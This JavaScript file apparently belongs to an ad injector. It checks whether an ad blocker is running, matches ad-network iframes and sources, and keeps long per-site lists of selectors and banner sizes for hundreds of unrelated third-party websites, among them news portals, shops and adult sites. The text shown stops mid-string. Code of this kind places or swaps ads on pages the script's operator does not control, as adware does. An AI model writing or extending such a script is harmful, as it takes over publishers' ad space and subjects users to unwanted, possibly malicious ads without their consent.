(function () {
    try {
        var all_init = function () {
            var count = 0;
            var ad_adl = 0;
            var ad_ad_2 = false;
            var ad_ad_3 = false;
            var ad_da_2 = false;
            var ad_da_3 = false;
            var ak = 0;
            var dd = document.createElement('div');
            dd.setAttribute('id', 'div-gpt-ad');
            dd.setAttribute('style', 'width:1px;height:1px');
            document.body.appendChild(dd);
            setTimeout(function () {
                if (dd.offsetWidth === 0 && dd.offsetHeight === 0) {
                    ak = 1;
                }
            }, 20);

            function $_GET(key) {
                var s = window.location.search;
                s = s.match(new RegExp(key + '=([^&=]+)'));
                return s ? s[1] : false;
            }

            function GetCssStyle(e) {
                if (e.currentStyle) return e.currentStyle; else if (window.getComputedStyle) return window.getComputedStyle(e, null)
            }

            function $$(sel) {
                var res = [];
                var els = document.querySelectorAll(sel);
                if (els && els.length > 0) {
                    res = els;
                }
                return res;
            }

            var if_di = function (a) {
                if (a.id.match(/(MB-iframe|adnzone_30|mgiframe|zd_async_frame|cdxhd_ifr|adnxs_tag|utif|ants-banner|actionteaser|SC_TBlock|lx_table|RTBIFR|yottos|DAIFR|lsadvert-zid|AdFox_banner|frame-innity|INNITYFrame|openx_spot|gnr|_poster_iframe|hsoub_adplace|_fw_frame_banner|adtimaIFrameWrapper|adnzone|exo_vidBanner|ads_zone|avp_zid|ad_ifr|adfox_iframe|AdFox_iframe|AdFox_plug|oas_frame|baner|advertur|republer|ya_partner_R|xhtml_banner|adfoxHtml5_iframe|__switch_placeholder|sovrn_ad_unit|advertur_section|ertb|eclick_ads_frame|Leaderboard|Marketing|Rectangle|sas|atwAdFrame|ox|aswift|google_decrypt_frame|cto_iframe|google_ads_iframe|google_ads_frame|rtm_iframe|ados_frame|adf_[0-9])/img)) {
                    return 1;
                } else {
                    return 0;
                }
            };
            var if_rs = function (a) {
                if (a.src.match(/\/\/(ad\.adriver\.ru|pipki\.r|show\.bumq\.com|mg\.mgid\.com|d\.otaserve\.net|delivery\.performax\.cz|adserve\.adpulse\.ir|toy69\.ru|ssl-tools\.bongacams\.com|www\.sabavision\.com|adserve\.adpulse|ads\.|servers1\.adriver\.ru|buckridge\.link|in\.fjjuo\.com|zog\.link|exoclick\.com|tsyndicate\.com|adst\.fwdcdn\.com|reklama\.ngs\.ru|s\.yimg\.com|a1\.ax\.rareru\.ru|cas\.ny\.us\.criteo\.com|cdn\.brand-display\.com|syndication\.exdynsrv\.com|www\.fullfilmizlesem\.com|www\.filmizlejet\.org|adserver\.reklamstore\.com|us-ads\.openx\.net|bit\.ly|01\.creativecdn\.com|www\.rek\.mobi|cdn\.html5maker\.com|static\.gyakorikerdesek\.hu|www\.netadclick\.com|ad\.serve-sys\.com|ox-d\.gamerpublishing\.com|cdn\.adfront\.org|securepubads\.g\.doubleclick\.net|mgid\.com|rtb\.imedia\.cz|www\.box\.bg|reklama\.wisdom\.bg|jdn\.monster\.com|secure\.adnxs\.com|cas\.criteo\.com|ad\.ilcdn\.fi|vg\.is\.fi|adfox\.vn|ads\.pantip\.com|news\.gnezdo\.ru|www\.adsellers\.net|shop\.gnezdo\.ru|static\.smi2\.net|banners|tools\.runetki\.co|aff\.abs-cdn\.org|ad\.lbbanners\.com|disqusads\.comads-iframe|in2\.zog\.link|in4\.zog\.link|www\.wetplace\.com|www\.traffictraffickers\.com|www\.milf\.nl|ads\.ero-advertising\.com|www\.updatetube\.com|updatetube\.com|in\.zog\.link|syndication\.exosrv\.com|ads\.adamoads\.com|jav68\.me|jav68\.tv|ads\.adxpansion\.com|olimpbanners\.info|hhcdn\.ru|a4\.ax\.rareru\.ru|adveasy\.ru|ads\.ad4game\.com|process\.nextads\.ir|coinad\.comads|ad\.afilo\.pl|static\.clickonometrics\.pl|search\.supplyframe\.com|c\.smartclick\.net|www\.zononi\.com|br2\.ru|code\.barrior\.ru|banner\.mediaweb\.ru|uploadbanner|s0\.2mdn\.netdfp|www\.trbetmedia\.com|media\.winaffiliates\.com|adserver\.advrstcdn\.com|cdn\.bannersnack\.com|h\.holder\.com\.ua|i\.holder\.com\.ua|reklami|toroadvertisingmedia\.com|speednetwork14\.adk2x\.com|ad\.a-ads\.com|www\.ad\.adtube\.ir|ireklama\.mk|xblasterads1\.com|b\.turbo\.az|vcdn\.media\.innity\.net|alipromo\.com|ads\.adfox\.ru|cdnvt\.ru|b\.frida\.vse42\.ru|in3\.zog\.link|br\.rk\.com|ads\.amakings\.com|medya\.ilan\.gov\.tr|blockadz\.com|mellowads\.com|s1\.dpb\.adnegah\.net|ad\.anetwork\.ir|ib\.adnxs\.com|uploadbanners|bk\.goodline\.info|backend\.opogame\.com|adi\.admicro\.vn|a2\.ax\.rareru\.ru|multi\.4smi\.ru|adimg\.uimserv\.net|nrzcj\.top|advideo\.uimserv\.net|ad\.adverticum\.net|i\.imedia\.cz|a\.clickyab\.com|ads2\.zeusclicks\.com|ads2\.wtfpeople\.com|tools\.bongacams\.com|ads\.theporndb\.com|pcash\.imlive\.com|d29gqcij\.com|static\.drtuber\.com|geo\.frtyd\.com|usr\.dropkickmedia\.com|a\.adnium\.com|web\.nxstx\.top|reg\.nxstx\.top|ads\.livembed\.com|i\.nxstx\.top|clkrev\.com|sendmad\.com|p\.nxstx\.top|cdn\.ambientplatform\.vn|speednetwork6\.adk2x\.com|ads\.medi-8\.net|cs\.adxpansion\.com|adblock|downloadha\.camp\.sabavision\.com|fastclick\.co|cdn\.asn\.advolution\.de|pub\.dreamboxcart\.com|ad\.doubleclick\.net|track\.adform\.net|sn\.sanoma\.fi|bdfrm\.bidvertiser\.com|cdn\.waframedia9\.com|adm\.shinobi\.jp|s0\.2mdn\.net|ads\.persgroep\.net|leaderboard\.php|zlavy\.sme\.sk|adx\.admicro\.vn|ads\.adsready\.com|oascentral\.sears\.com|s3-sa-east-1\.amazonaws\.com|ads\.egrana\.com\.br|p3\.adhitzads\.com|akhtm\.nspmotion\.com|gocdn\.ru|www\.tradeadexchange\.com|creative\.wwwpromoter\.com|adserver\.adtech\.de|servedby\.pixfuture\.net|partnernews\.php|www\.tredman\.com|superkinobob\.ru|onedrive\.su|twodrive\.su|cdn7\.rocks|ads\.betweendigital\.com|bxjch\.top|cszz\.ru|advert\.php|mxtads\.com|funsmi\.ru|cshi\.ru|smilered\.com|aka-cdn-ns\.adtech\.de|r\.mradx\.net|media\.adrcdn\.com|images\.pub\.goha\.ru|in\.kpyub\.com|adserver\.juicyads\.com|partners\.smmnewscenter\.com|ams1-ib\.adnxs\.com|invideo\.ero-advertising\.com|t05\.vipstreamservice\.com|dyn\.empflix\.com|as\.sexad\.net|ad_detail\.html\?ad=footer|www\.bravoporn\.com|dyn\.tnaflix\.com|adserver\.exoticads\.com|delivery\.trafficforce\.com|delivery\.porn\.com|www\.urldelivery\.com|ads\.trafficjunky\.net|rotator\.trafficstars\.com|hilltopads\.net|ads2\.contentabc\.com|ads\.contentabc\.com|ss\.phncdn\.com|cdn1d-static-shared\.phncdn\.com|trw12\.com|in5\.zog\.link|sunstatic\.fuckandcdn\.com|syndication\.traffichaus\.com|adv\.h2porn\.com|ads\.h2porn\.com|adspaces\.ero-advertising\.com|adbucks\.brandreachsys\.com|prwidgets\.com|seventeenlive\.com|mobileads\.ero-advertising\.com|ad2\.adfarm1\.adition\.com|tpc\.googlesyndication\.com)/img)) {
                    return 1;
                } else {
                    return 0;
                }
            };

            var host = document.location.host;
            var body = document.querySelector("body");
            if (body) {
                var body_width = body.offsetWidth;
                var body_height = body.offsetHeight;
            } else {
                return;
            }
            var a_7 = '*margin:5px auto;*d*728*90**';
            var str_dm_ad = 'football.kulichki.net*div[class^="bunner_container"]*""*b**giaoducthoidai.vn*div[id^="adsctl00"]*""*b**keonhacai.com*div[class^="right_pane"]*""*a**keonhacai.com*div[class^="container-inner"]*""*a**www.xemgame.com*div[class^="col-sm-10 kqcenter"]*""*a**www.xemgame.com*div[id^="top-ads"]*""*a**www.xemgame.com*div[class^="right-con"]*""*b**baodansinh.vn*div[class^="adv fr"]*""*a**hocmai.vn*div[id^="support-"]' + a_7 + 'vkool.net*div[id^="float_content"]*""*b**vkool.net*div[id^="ad_top_banner"]*""*a**animetvn.com*div[class^="gnarty-offads"]*""*b**www.hdsieunhanh.com*div[class^="group coming"]' + a_7 + 'blogtruyen.com*div[id^="topbanner"]*""*a**tv.101vn.com*div[class^="leaderboard_banner"]*""*a**tv.101vn.com*div[class^="right_pane"]*""*a**tv.101vn.com*div[class^="container-inner"]*""*a**www.nguyenkim.com*div[id^="banner_slider"]*""*a**www.hotdeal.vn*div[class^="block__content tab-content"]' + a_7 + 'www.nguyenkim.com*div[id^="main-product_"]' + a_7 + 'www.yeutretho.vn*.ads*""*b**tinnhanhchungkhoan.vn*div[id^="adsct"]*""*b**truyentranh.net*div[class^="BoxADV"]*""*a**www.dienmayxanh.com*ul[class^="homeproduct"]' + a_7 + 'ictnews.vn*div[class^="header-banner"]*""*a**vietdesigner.net*div[class^="cb-line clearfix"]' + a_7 + 'vndoc.com*div[class^="adbox"]*""*a**www.adayroi.com*div[id^="segment_vingroup_banners"]*""*a**www.adayroi.com*div[class^="homepage-category theme"]' + a_7 + 'www.sieuthitaigia.vn*div[id^="adv-top"]*""*a**tructiepbongda.com*div[id^="fullad"]*""*b**tructiepbongda.com*div[class^="widgetcontent"]*""*b**tuyensinh247.com*div[class^="ads"]*""*a**tuyensinh247.com*div[class^="banner"]*""*b**fptplay.net*div[class^="ads_"]*""*b**vetv.vn*div[id^="glive_banner"]*""*a**truyentranh8.net*div[id^="quangcaotop2"]*""*a**xemphimso.com*div[class^="xps_ads"]*""*b**thuvienphapluat.vn*div[class^="goiDvu-footer"]*""*a**plo.vn*div[id^="banner"]*""*a**muaban.net*div[class^="banner-middel"]*""*a**7msport.com*div[class^="ad3"]*""*b**www.vietnamworks.com*div[id^="ads_ADV_CAMPAIGN"]*""*a**thiendia.com*center*""*a**www.kingsport.vn*div[class^="cat-prod"]' + a_7 + 'www.kingsport.vn*div[class^="group-adv"]*""*b**baodautu.vn*ul[id^="ads_"]*""*b**baodautu.vn*div[class^="ads"]*""*b**xehay.vn*div[id^="banner1ab"]*""*a**batdongsan.com.vn*div[class^="adPosition"]*""*b**www.tienphong.vn*div[id^="Web_"]*""*b**quantrimang.com*div[class^="adx-zone"]*""*b**laodong.com.vn*div[id^="ads"]*""*b**gamevui.vn*div[id^="ads"]*""*b**fptshop.com.vn*div[class^="f-slright"]*""*a**mywork.com.vn*div[class^="web-wrapper"]*""*a**mywork.com.vn*div[class^="adright"]*""*a**mywork.com.vn*div[class^="adleft"]*""*a**truykich.vn*div[class^="owl-wrapper-outer"]*""*a**lienminh360.vn*div[id^="widget_sp_image-5"]*""*a**lienminh360.vn*div[class^="blockrows"]' + a_7 + 'www.foody.vn*div[class^="banner-slide"]*""*a**healthplus.vn*div[class^="banner"]*""*b**pose.com.vn*div[class^="articleTile ads bigBlock"]*""*a**tiki.vn*div[class^="home-block-wrap"]' + a_7 + 'vtc.vn*div[class^="adv"]*""*b**www.thuocbietduoc.com.vn*div[class^="adv_"]*""*b**congan.com.vn*div[class^="ads-"]*""*b**vatgia.com*div[id^="vatgia_home_new_200x360"]*""*a**www.giadinhvietnam.com*div[class^="adv"]*""*b**www.giadinhvietnam.com*div[class^="main-col-banner"]*""*a**www.fshare.vn*div[class^="content_banner_ev"]*""*a**tuoitre.vn*div[id^="Rgiht"]*""*b**vov.vn*div[id^="QCctl00_mainContent"]*""*b**www.baogiaothong.vn*div[class^="right ad_header"]*""*a**www.baogiaothong.vn*div[class^="hideprint"]*""*b**clipfapx.com*center[style^="text-align: center;"]*""*a**watch.thtube.com*center[style^="text-align: center;"]*""*a**www.powerbuy.co.th*div[class^="container hidden-sm"]*""*a**photo.7mth.com*div[class^="pp_box"]' + a_7 + 'cherry-porn.com*div[class^="aboutus widget_text"]*""*a**www.thaifranchisecenter.com*table[class^="ad_a"]*""*b**siam-movie.com*aside[id^="text-2"]*""*a**zeanstep.com*div[class^="bannergroup"]*""*b**www.thansettakij.com*div[class^="col-md-12 text-center"]*""*b**www.gamemonday.com*li[id^="ajdg_grpwidgets"]*""*b**sex.javhidef.com*center[style^="text-align: center;"]*""*a**youpornxxxx.com*div[id^="ads"]*""*b**www.doballclub.com*aside[id^="text-10"]*""*a**www.doballclub.com*center*""*a**v2.xxx888porn.com*div[align^="center"]*""*b**www.banidea.com*.defaultBg' + a_7 + 'www.banpolballs.com*div[class^="white_content"]*""*b**gameoverth.com*div[class^="a_mu"]*""*a**www.dailyenglish.in.th*div[class^="wpb_wrapper"]' + a_7 + 'www.1000tep.com*div[class^="col-lg-12 tags_cat"]*""*a**www.1000tep.com*div[class^="col-lg-9 adst"]*""*a**www.jobbkk.com*div[id^="wrap-bannerRight"]*""*a**www.hugball.com*div[class^="container bannertop"]*""*a**www.hugball.com*div[class^="banner"]*""*b**ballnaja.com*div[class^="a1-banner"]*""*a**www.cz-podzone.com*div[class^="clear nowrap"]*""*a**www.doofootball.com*div[class^="container banner"]*""*b**www.ballzaa.com*div[class^="banner_1000"]*""*b**www.siamdara.com*div[class^="warpper"]' + a_7 + 'nekopost.net*div[class^="col-md-6"]*margin:5px auto;*d*468*60**apps.garena.in.th*div[class^="hero__info__top"]' + a_7 + 'www.looksi.com*div[class^="cms-row"]' + a_7 + 'taradplaza.com*div[class^="box-bot-banner"]*""*b**yedtubehd.com*center*""*a**www.aelitaxtranslate.com*section[id^="colormag_featured_posts_widget"]' + a_7 + 'v2.allurexxxclub.com*div[id^="text-6"]*""*a**www.wtfintheworld.com*div[class^="vc_row wpb_row td-pb-row"]' + a_7 + 'naewna.com*div[class^="banner300 top"]*""*a**www.skyscanner.co.th*div[class^="shelf timeline-middleground"]' + a_7 + 'specphone.com*div[class^="adsSubmenu"]*""*b**central.co.th*section[class^="stripBanner"]*""*a**www.macthai.com*div[class^="side-ad"]*""*b**www.painaidii.com*div[id^="main-"]' + a_7 + 'www.boxzaracing.com*div[class^="_banner"]*""*b**www.wemall.com*div[class^="banner"]*""*b**www.it24hrs.com*li[class^="adrotate_widgets"]*""*b**www.voicetv.co.th*div[class^="row homepage-row"]' + a_7 + 'xxxpostpic.org*div[class^="adscenter"]*""*b**www.kaazip.com*div[id^="td_uid"]' + a_7 + 'www.trueplookpanya.com*.education-banner*""*a**www.news-lifestyle.com*div[class^="row index_left2_main"]' + a_7 + 'bangkok.com*div[class^="row-containe"]' + a_7 + 'xxxporn7.com*div[class^="ad ad_top_2"]*""*a**www.jobthai.com*div[id^="hotjobholder"]*""*a**www.vcharkarn.com*div[id^="echobanner"]*""*b**www.nationtv.tv*div[class^="ads"]*""*b**www.pantipmarket.com*div[id^="pmk_extended_display"]*""*a**droidsans.com*li[class^="infinite-post dr-post-feed"]' + a_7 + 'www3.mampost.com*article[id^="itunesmodule"]' + a_7 + 'jarm.com*div[class^="_banner"]*""*a**www.niceoppai.net*div[id^="bvr-adp"]*""*a**www.kingsmanga.net*div[class^="col-md-12 text-center"]*""*a**notebookspec.com*div[class^="container text-center"]*""*b**kaijeaw.com*div[class^="row category-block"]' + a_7 + 'www.siamhahe.com*div[id^="tpcrn_magazine_doublethumb"]' + a_7 + 'bugaboo.tv*section[class^="content-area"]' + a_7 + 'www.overclockzone.com*div[class^="rectra"]*""*a**www.overclockzone.com*.ads*""*b**jokergameth.com*div[class^="collapse"]' + a_7 + 'coconuts.co*section[class^="co-channel"]' + a_7 + 'www.teenee.com*div[id^="section_"]' + a_7 + 'www.ais.co.th*div[class^="container-main"]' + a_7 + 'www.lnwshop.com*div[class^="box_shadow_chrome"]' + a_7 + 'goal.in.th*div[class^="ajax-banner banner-i1"]*""*a**goal.in.th*div[id^="ads_top_content"]*""*a**oknation.nationtv.tv*div[class^="s3right"]*""*a**soccersuck.com*div[class^="adsever"]*width:200px;height:800px;*a**soccersuck.com*div[class^="adv_"]*""*b**www.realnakedgfs.com*div[id^="front-add"]*""*a**www.lesbian8.com*div[class^="ads"]*""*b**www.slutload.com*div[class^="no-span"]*""*a**www.hd21.com*div[class^="drt-spot-frame"]*""*a**yourlust.com*/im/footer*""*c**www.porntube.com*/ad_detail*""*c**www.4tube.com*/ad_detail*""*c**www.digisport.ro*div[class^="ads mediumrectangle"]*""*b**www.emag.ro*section[class^="mktp-banner-sell-with-emag homepage-banner-"]*""*a**newsinfo.inquirer.net*div[class^="tsa-"]*""*b**www.bbc.com*div[class^="advert advert"]*height:200px;*a**www.bbc.com*div[class^="advert advert"]*""*b**nts.org.pk*ul[class^="slides"]*""*b**jang.com.pk*div[class^="row content-row"]' + a_7 + 'javedch.com*div[class^="categoryholder cf"]' + a_7 + 'dailypakistan.com.pk*div[class^="c5ab-widget widget_posts-widget c5ab"]*margin:5px auto;*d*468*60**emdep.vn*div[class^="ads"]*""*b**www.blogphongthuy.com*div[class^="chatboxcontent"]*""*a**www.doisongphapluat.com*div[class^="banner-top pkg"]*height:200px;*a**trandaiquang.org*div[class^="bannerctv"]*""*a**baodauthau.vn*div[id^="adsctl00_SideBar_AdsTopRightTop"]*""*a**tinhte.vn*div[class^="promote section position"]*margin:10px auto;*d*728*90**lazada.vn*div[class^="c-layout-container__section c-mp-section "]*margin:10px auto;*d*728*90**8live.com*div[class^="images-banner-inner"]*""*a**8live.com*div[id^="banner"]*""*a**vtv.vn*div[class^="box-ads-top"]*""*a**www.daikynguyenvn.com*div[id^="ads300_250"]*""*a**www.kaidee.com*div[id^="list_lb"]*height:200px;*a**manager.co.th*div[class^="banner_970x250"]*""*a**www.037hd.com*div[class^="bireklam"]*""*b**www.037hd.com*div[class^="sidebar-right"]*""*b**pantip.com*div[class^="ads-leaderboard"]*height:200px*a**www.snapdeal.com*div[class^="adtechGoldBanner"]*""*b**www.manoramaonline.com*div[id^="advt-slot"]*""*b**www.rediff.com*div[id^="div_advt_right"]*""*a**www.list.am*div[id^="ad4"]*""*a**www.list.am*div[id^="bnr"]*""*a**www.list.am*div[id^="sqrbnr"]*""*a**krisha.kz*div[id^="brPlace_251"]*""*a**www.inbox.lv*https://www.inbox.lv/*""*c**www.mediamarkt.es*div[id^="megabanner-"]*""*b**kds0008.cc*ad/*""*c**90tv.ir*div[class^="ads-boxes"]*""*b**www.dizibox1.com*div[class^="adv-header-bottom"]*""*b**www.takealot.com*div[class^="sb sb-r"]*""*b**nesn.com*div[id^="acm_ad_zones-77"]*""*b**idope.se*div[id^="categorydiv"]*""*a**www.mackolik.com*div[class^="baner300x250"]*""*b**www.arte.tv*article[class^="next-teaser-banner"]*""*b**www.lindaikejisblog.com*div[class^="da side_first hidden-xs"]*""*a**www.atv.com.tr*div[class^="banner"]*""*b**fararu.com*div[class^="ads"]*""*b**www.memurlar.net*div[class^="defaultAds"]*""*b**www.bom.gov.au*aside[id^="advertising"]*""*a**www.service-public.fr*div[class^="ads ads-aside"]*""*b**www.alsbbora.com*div[class^="ad-area-wide adplace"]*""*b**www.alwakeelnews.com*div[class^="bestaAds_desktop"]*""*b**www.r18.com*p[class^="cmn-box-banner01"]*""*b**mover.uz*div[class^="block-info-vertical"]*""*a**showcase.skrill.com*div[class^="carousel-inner"]*""*a**entekhab.ir*div[class^="tabligh col-xs-36"]*""*b**www.onlinekhabar.com*div[id^="right_ads"]*""*b**garaanews.com*div[class^="grid12 mt10"]*""*b**www.bb.com.br*div[class^="picture desktop ng-scope"]*""*b**www.konga.com*div[class^="right_side_deal"]*""*a**www.rainews.it*div[class^="head box"]*""*a**pagalworld.me*https://pagalworld.me/*""*c**www.sammobile.com*div[class^="g-single a-17"]*""*a**www.sammobile.com*div[class^="a-single a-32"]*""*a**www.shahrekhabar.com*div[class^="sidebar right"]*""*a**societegenerale.fr*section[class^="eimm-std-col eimm-promo-banner"]*""*a**uloz.to*//advert.uloz.to/*""*c**www.boursorama.com*div[id^="sas_601"]*""*a**www.boursorama.com*div[id^="sas_795"]*""*a**www.cabelas.com*div[id^="CW1"]*""*a**colorlib.com*div[id^="text-"]*""*b**xehoiviet.com*div[class^="dk-car-banner"]*""*b**www.mashreghnews.ir*section[id^="box55"]*""*a**pornohub.su*div[class^="td_mod_wrap"]*""*a**www.makeleio.gr*aside[id^="tn_text-120"]*""*a**www.elzmannews.com*div[class^="banners"]*""*b**www.mehrnews.com*div[class^="box ads"]*""*b**www.hltv.org*div[class^="col-rek2"]*""*b**www.khabaronline.ir*.advContainer*""*b**www.asriran.com*http://asriran.camp.*""*c**www.aastocks.com*http://hkg3.aastocks.com/*""*c**persianblog.ir*div[id^="ads"]*""*a**www.haberturk.com*div[class^="ads-zone"]*""*b**www.focus.de*div[class^="srDroSn"]*""*a**sport.interia.pl*div[class^="boxBody"]*""*b**alwafd.org*div[class^="special-banner"]*""*a**www.elbalad.news*div[class^="block  adv300 newplace"]*""*a**www.flirt4free.com*div[class^="bannerFooterWrap"]*""*a**tabnak.ir*aside[class^="col-md-5 visible-lg visible-md padd_home_right home_adv_height"]*""*a**www.azlyrics.com*div[class^="hidden-xs rect-ad"]*""*a**p30download.com*//p30download.com/*""*c**www.wykop.pl*div[id^="banner_top_"]*""*a**www.mamba.ru*div[class^="adv-slide-block-wrapper"]*""*a**3sk.tv*div[class^="banner2"]*""*b**www.donanimhaber.com*div[id^="dha_1_0_876_2_1"]*""*a**www.donanimhaber.com*div[id^="dha_1_0_875_6_1"]*""*a**www.farsnews.com*div[class^="adscolumn"]*""*a**www.cbsnews.com*div[data-component^="smartBanner"]*""*a**www.emol.com*div[class^="publi_"]*""*b**curapelanatureza.com.br*div[id^="block-block-16--2"]*""*a**www.azlyrics.com*div[class^="hidden-xs rect-ad"]*""*a**www.spiegel.de*div[class^="innerwrapad"]*""*b**www.instagram.com*article[class^="_h2d1o"]*padding-bottom:10px;margin-top: -6px;*d*468*60**www.drive2.ru*div[class^="c-block c-block--base"]*margin-bottom:10px;*d*468*60**www.msn.com*div[class^="stripecontainer"]*width:728px;margin:0 auto;*d*728*90**www.flipkart.com*div[class^="_2QUpwp required-tracking"]*height:90px;margin-bottom:10px;*d*728*90**lazada*div[class^="c-layout-container__section c-mp-section"]*margin-top:10px;*d*728*90**www.uol.com.br*.mod-horizontal*margin-top:10px;*d*728*90**seasonvar.ru*header[class^="header"]*width:728px;margin:10px auto;*d*728*90**www.parimatch.by*div[class^="layout-header"]*width:915px;margin:10px auto;*d*915*250**av.by*header[class^="header"]*width:915px;margin:10px auto;*d*915*250**bigcinema.to*div[id^="block_top"]*width:915px;margin:10px auto;*d*915*250**www.mthai.com*section[class^="group-section"]*width:728px;margin:10px auto;*d*728*90**rutracker.org*//rutrk.org/*""*c**www.nuvid.com*www.nuvid.com*""*c**www.porntube.com*/ad_detail*""*c**www.eporner.com*/dot/foot*""*c**www.eporner.com*/dot/ntv*""*c**www.yourlust.com*/im/footer*""*c**hellporno.com*hellporno.com*""*c**xbabe.com*xbabe.com*""*c**www.hd21.com*/hd21*""*c**www.daporn.com*/frames/*""*c**www.fux.com*/ad_detail*""*c**www.avito.ru*div[id^="ads"]*""*b**reddit.com*div[id^="ad_"]*""*b**rutracker.org*div[class^="bn-idx"]*""*b**www.xnxx.com*div[class^="adframeBlock"]*""*b**www.xvideos.com*div[class^="adframeBlock"]*""*b**www.youtube-mp3.org*#rad*""*b**www.pravda.com.ua*div[class^="unit_top-banner_main"]*""*b**znaj.ua*div[class^="znaj-banners"]*""*b**www.unian.net*div[id^="admixer"]*""*b**www.newmovie-hd.com*div[id^="banner"]*""*b**www.newmovie-hd.com*div[class^="execphpwidget"]*""*b**www.khaosod.co.th*div[class^="wpb_single_image wpb_content_element vc_align_center"]*""*b**manager.co.th*div[class^="banner_"]*""*b**www.bangkokpost.com*div[class^="boomboxSize1"]*""*b**thethao247.vn*div[id^="ads_content"]*""*b**www.kp.ru*div[class^="boxFrame"]*""*b**kinogo*div[class^="rek_top"]*""*a**kinogo*div[class^="icons3"]*""*a**yahoo.com*#sticky-lrec2-footer*""*a**hotline.ua*div[id^="top-big-banner"]*""*a**www.movie2free.com*div[class^="notice"]*""*a**www.dek-d.com*div[id^="global-ads"]*""*a**www.dek-d.com*div[id^="click-zone"]*""*a**www.khaosod.co.th*div[class^="td-a-rec td-a-rec-id-ud_b4x_post_ad"]*""*a**www.khaosod.co.th*div[class^="td-a-rec td-a-rec-id-ud_under_menu_post_ad"]*""*a**www.matichon.co.th*div[class^="td-a-rec td-a-rec-id-ud_under_menu_post_ad"]*""*a**bloggang.com*td[class^="bgtopbanner"]*""*a**www.bangkokpost.com*div[id^="survey-popup"]*""*a**mastermovie-hd.com*aside[class^="widget widget-categories"]*""*a**vtv.vn*#vtvAdv_advTop*""*a**nhadatso.com*div[class^="wrapper-col-2"]*""*a**news.am*div[class^="wrapper-col-2"]*background:#fff;*a**news.am*div[class^="partners-articles"]*background:#fff;*a';
            var str_dm_ad_2 = 'vneconomy.vn*div[class^="contentleft"]*200**sstruyen.com*div[class^="hot-bg"]*250**sexgai.net*footer[id^="footer"]*250**sexgai.net*div[id^="details"]*250**sexgai.net*div[id^="content"]*250**muare.vn*div[class^="mainContent"]*250**www.hosocongty.vn*div[class^="columnLeft"]*250**www.vietinbank.vn*div[class^="clearfix box3"]*200**ngoisao.vn*div[class^="content-chuyenmuc"]*250**game8.vn*div[id^="div_Home_ListNewsPartial"]*250**www.vietgiaitri.com*div[id^="content"]*250**thachpham.com*div[class^="container home-featured"]*90**giaoduc.net.vn*div[class^="inner-wrap"]*250**edumall.vn*section[id^="section-highlight"]*250*5gdt.gov.vn*div[class^="wpsPortletGDTSkin2"]*200**www.minhngoc.net.vn*div[class^="dnw-content-layout"]*200**www.xemgame.com*div[class^="dongsukiengame"]*200**baodansinh.vn*div[class^="content_bottom clearfix"]*90**gamelumi.com*div[class^="yxJpList"]*200**go.vn*div[class^="col_n_left"]*250**truyentranhtuan.com*div[id^="main-content"]*250**giadinh.net.vn*div[class^="contentl fl"]*250**vieclam24h.vn*div[class^="box_content_nofi_s00 no-border"]*90**www.bkav.com.vn*div[id^="p_p_id_productsintro_WAR_BkavUIportlet_"]*90**www.stablehost.com*section[class^="section-products"]*90**www.hdsieunhanh.com*section[id^="scroll-phimhot"]*200**kenhsinhvien.vn*div[class^="sidebar btmRightBlocks"]*250**www.kites.vn*div[id^="article-home"]*200**phimhayso.com*div[class^="section"]*90**blogtruyen.com*div[id^="top-newest-comment"]*600**hqapps.net*div[id^="main"]*250**www.timviecnhanh.com*section[class^="body-home"]*250**www.vnwebgame.com*div[class^="introduce"]*200**khoahoc.tv*div[class^="listbox relatedlist"]*400**www.hotdeal.vn*div[class^="product product--details"]*250**lamchame.vn*div[class^="row mt20"]*250**tubep.com*div[id^="content"]*250**www.beat.vn*div[class^="right-inner"]*400**2idol.tv*div[id^="post-container"]*250**rongbay.com*div[class^="area_content_home"]*90**news.otofun.net*div[class^="section-right"]*600**www.yeutretho.vn*div[class^="col860 fl"]*200**thethaovanhoa.vn*div[class^="clearfix chitiet_r f_l"]*200**mibet.mobi*div[class^="all-icon-service"]*90**tinnhanhchungkhoan.vn*section[class^="focus"]*200**sohoa.vnexpress.net*div[class^="width_common line_col"]*200**anime14.net*div[class^="ml-title"]*200**truyentranh.net*div[class^="col-md-4"]*600**truyentranh.net*section[class^="bodycontainer"]*90**infonet.vn*div[class^="site-wrap"]*90**www.dienmayxanh.com*section[id^="main-container"]*250**xem.vn*div[id^="leftColumn"]*200**kul.vn*div[class^="section container--list"]*200**mangak.info*div[class^="top_thang"]*250**ictnews.vn*div[class^="news-center"]*200**docbao.vn*div[class^="news_top"]*250**thichtruyentranh.com*div[id^="boxslide_2"]*200**sachgiai.com*div[id^="hot-news"]*250**websosanh.vn*div[id^="banner-promotion"]*250**vndoc.com*div[id^="leftsidebar"]*600**deal.adayroi.com*div[id^="suggested_products"]*250**violet.vn*div[id^="main"]*200**blogtin.com*div[class^="detail_content"]*200**vuighe.net*div[class^="tray-content index"]*250**diadiemanuong.com*div[id^="grid_video"]*200**xskt.com.vn*section[id^="center-content"]*200**bomtan.org*div[id^="player_field"]*250**bomtan.org*div[id^="phim-hot-thang"]*90**vetv.vn*div[id^="option-stream"]*250**4share.vn*div[class^="row home-page"]*90**truyentranh8.net*div[class^="TitleH2 text-danger"]*200**www.tinmoi.vn*div[class^="headlines-cate blue-cate"]*250**www.vntrip.vn*div[class^="hot-place"]*250**xemphimso.com*div[id^="player"]*250**plo.vn*div[id^="main1"]*90**danketoan.com*div[class^="nodeList sectionMain"]*250**muaban.net*div[id^="dvContent"]*250**vuigame.vn*div[id^="homepage-top"]*90**vnreview.vn*div[id^="column-2"]*250**tiin.vn*div[id^="middle-body"]*250**home.vn*div[class^="other-news-left-style"]*200**vietjetair.com*div[id^="content"]*90**www.vietnamairlines.com*div[class^="bg-white"]*90**saostar.vn*div[class^="list_vertical_news"]*250**sextop1.net*div[id^="content"]*200**xemvtv.net*div[id^="pages"]*200**www.mibet.com*div[class^="content-bottom"]*200**www.vietnamplus.vn*section[class^="extra-contents"]*200**chiasenhac.vn*table[class^="page-dsms"]*200**bestie.vn*div[class^="page-detail"]*90**bestie.vn*div[class^="row bdt"]*200**www.tienphong.vn*main[id^="page-home"]*90**quantrimang.com*div[class^="content-detail"]*200**quantrimang.com*div[class^="navbox sidenav"]*600**laodong.com.vn*div[class^="clearfix video-box"]*200**nhattao.com*div[class^="mainContent withTransition"]*250**gamevui.vn*div[class^="wbox mageta hottags"]*200**www.bong99.com*section[class^="home-page"]*90**baodatviet.vn*div[id^="photoslide"]*250**vietbao.vn*div[class^="module mod-gocnhin left1"]*600**vietbao.vn*div[id^="con2"]*200**laban.vn*li[id^="home_directory_4"]*250**fptshop.com.vn*div[class^="detail-container"]*250**fptshop.com.vn*div[class^="row 